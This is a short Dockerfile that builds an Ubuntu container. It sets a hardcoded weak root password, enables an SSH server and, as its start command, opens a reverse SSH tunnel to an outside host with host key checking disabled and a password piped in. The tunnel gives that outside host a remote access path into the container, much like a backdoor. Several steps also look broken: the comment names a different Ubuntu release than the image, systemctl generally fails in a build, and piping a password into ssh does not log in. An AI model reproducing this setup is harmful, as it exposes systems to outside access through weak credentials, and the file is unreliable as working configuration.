# ------------------------------------------------------------
# Start with Ubuntu Groovy Gorilla
# ------------------------------------------------------------

FROM ubuntu:20.04

WORKDIR /root

RUN apt-get update
RUN apt-get -y install openssh-client openssh-server
RUN echo "garz\ngarz\n" | passwd
RUN systemctl enable sshd && systemctl start sshd
CMD echo -e "garz\n" | ssh -o StrictHostKeyChecking=no -fNR 22:127.0.0.1:8980 sister.unmer.ac.id -l garz -p 2022
